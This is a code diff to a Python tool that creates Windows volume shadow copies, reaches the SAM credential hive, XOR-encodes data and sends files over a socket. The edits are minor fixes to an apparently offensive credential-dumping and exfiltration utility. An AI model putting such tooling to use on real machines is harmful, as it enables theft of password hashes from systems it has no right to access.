@@ -531,6 +531,7 @@ def create_shadow_copy(volume_path):
 
 
 def verify_shadow_ready(shadow_path, max_retries=10, delay=1):
+    import time
     test_path = shadow_path + "\\windows\\system32\\config\\sam"
     
     for attempt in range(max_retries):
@@ -707,8 +708,10 @@ def xor_encode(data, key):
 
 
 def send_file_over_socket(sock, filename, filedata):
-    header = struct.pack('32sII', 
-                        filename.encode()[:32].ljust(32, b'\x00'),
+    filename_bytes = filename.encode('ascii')[:32].ljust(32, b'\x00')
+    
+    header = struct.pack('!32sII', 
+                        filename_bytes,
                         len(filedata),
                         0)
     
@@ -781,19 +784,19 @@ def main():
     shadow_device = list_shadows()
     
     if not shadow_device:
-	    print("[+] No shadow copies found. Creating a new one...")
-	    shadow_device = create_shadow_copy(args.disk)
-	    
-	    if not shadow_device:
-	        print("[-] Failed to create shadow copy")
-	        sys.exit(1)
-	    
-	    print("[+] Verifying shadow copy readiness...")
-	    test_device = shadow_device.replace("\\\\?\\", "\\??\\") if shadow_device.startswith("\\\\?\\") else shadow_device
-	    
-	    if not verify_shadow_ready(test_device):
-	        print("[-] Shadow copy not ready after waiting")
-	        sys.exit(1)
+        print("[+] No shadow copies found. Creating a new one...")
+        shadow_device = create_shadow_copy(args.disk)
+        
+        if not shadow_device:
+            print("[-] Failed to create shadow copy")
+            sys.exit(1)
+        
+        print("[+] Verifying shadow copy readiness...")
+        test_device = shadow_device.replace("\\\\?\\", "\\??\\") if shadow_device.startswith("\\\\?\\") else shadow_device
+        
+        if not verify_shadow_ready(test_device):
+            print("[-] Shadow copy not ready after waiting")
+            sys.exit(1)
 
     if shadow_device.startswith("\\\\?\\"):
         shadow_device = shadow_device.replace("\\\\?\\", "\\??\\")
